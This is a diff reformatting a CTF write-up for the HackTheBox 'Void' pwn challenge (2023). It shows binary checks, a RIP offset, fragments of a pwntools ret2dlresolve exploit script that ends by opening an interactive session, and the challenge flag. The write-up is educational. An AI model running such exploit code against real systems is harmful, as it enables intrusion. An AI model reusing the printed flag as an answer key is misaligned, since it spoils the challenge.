@@ -1,21 +1,38 @@
 ---
-Name: Void
-Category: Pwn
-Difficulty: Medium
+name: Void (2023)
+event: HackTheBox Cyber Apocalypse - Intergalactic Chase CTF 2023
+category: Pwn
+description: Writeup for Void (Pwn) - HackTheBox Cyber Apocalypse - Intergalactic Chase CTF (2023) 💜
+layout:
+    title:
+        visible: true
+    description:
+        visible: true
+    tableOfContents:
+        visible: false
+    outline:
+        visible: true
+    pagination:
+        visible: true
 ---
 
+# Void
+
 ## Description
->The room goes dark and all you can see is a damaged terminal. Hack into it to restore the power and find your way out.
+
+> The room goes dark and all you can see is a damaged terminal. Hack into it to restore the power and find your way out.
 
 ## Solution
+
 Check file properties and binary protections.
+
 ```bash
-file void 
+file void
 void: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter ./glibc/ld-linux-x86-64.so.2, BuildID[sha1]=a5a29f47fbeeeff863522acff838636b57d1c213, for GNU/Linux 3.2.0, not stripped
 ```
 
 ```bash
-checksec --file void 
+checksec --file void
 [*] '/home/crystal/Desktop/challenge/void'
     Arch:     amd64-64-little
     RELRO:    Partial RELRO
@@ -28,9 +45,9 @@ checksec --file void
 PwnTools script finds offset of 72 for RIP.
 
 [ret2dlresolve](https://ir0nstone.gitbook.io/notes/types/stack/ret2dlresolve/exploitation) exploit works with little modification.
+
 ```python
 from pwn import *
-
 
 # Allows you to switch between local/GDB/remote from terminal
 def start(argv=[], *a, **kw):
@@ -40,7 +57,6 @@ def start(argv=[], *a, **kw):
         return remote(sys.argv[1], sys.argv[2], *a, **kw)
     else:  # Run locally
         return process([exe] + argv, *a, **kw)
-
 
 # Find offset to EIP/RIP for buffer overflows
 def find_ip(payload):
@@ -53,7 +69,6 @@ def find_ip(payload):
     ip_offset = cyclic_find(p.corefile.read(p.corefile.sp, 4))  # x64
     warn('located EIP/RIP offset at {a}'.format(a=ip_offset))
     return ip_offset
-
 
 # Specify GDB script here (breakpoints etc)
 gdbscript = '''
@@ -97,4 +112,4 @@ io.sendline(dlresolve.payload)                # now the read is called and we pa
 io.interactive()
 ```
 
-`HTB{r3s0lv3_th3_d4rkn355}`
+Flag: `HTB{r3s0lv3_th3_d4rkn355}`
